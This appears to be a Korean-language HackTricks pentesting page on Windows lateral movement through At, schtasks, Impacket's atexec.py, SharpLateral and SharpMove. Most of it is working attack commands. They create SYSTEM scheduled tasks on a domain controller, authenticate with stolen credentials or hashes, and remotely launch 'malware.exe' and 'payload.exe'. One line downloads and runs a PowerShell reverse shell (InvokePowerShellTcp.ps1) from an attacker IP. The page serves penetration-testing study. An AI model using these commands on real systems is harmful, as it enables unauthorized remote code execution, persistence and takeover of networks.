# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## How Does it works

At는 사용자 이름/(비밀번호/해시)를 알고 있는 호스트에서 작업을 예약할 수 있게 해줍니다. 따라서 이를 사용하여 다른 호스트에서 명령을 실행하고 출력을 얻을 수 있습니다.
```
At \\victim 11:00:00PM shutdown -r
```
schtasks를 사용하여 먼저 작업을 생성한 다음 호출해야 합니다:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
**Impacket의 `atexec.py`**를 사용하여 AT 명령을 사용하여 원격 시스템에서 명령을 실행할 수 있습니다. 이는 대상 시스템에 대한 유효한 자격 증명(사용자 이름 및 비밀번호 또는 해시)이 필요합니다.
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
[SharpLateral](https://github.com/mertdas/SharpLateral)도 사용할 수 있습니다:
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
[SharpMove](https://github.com/0xthirteen/SharpMove)를 사용할 수 있습니다:
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
[**실버 티켓과 함께 schtasks 사용에 대한 더 많은 정보는 여기**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
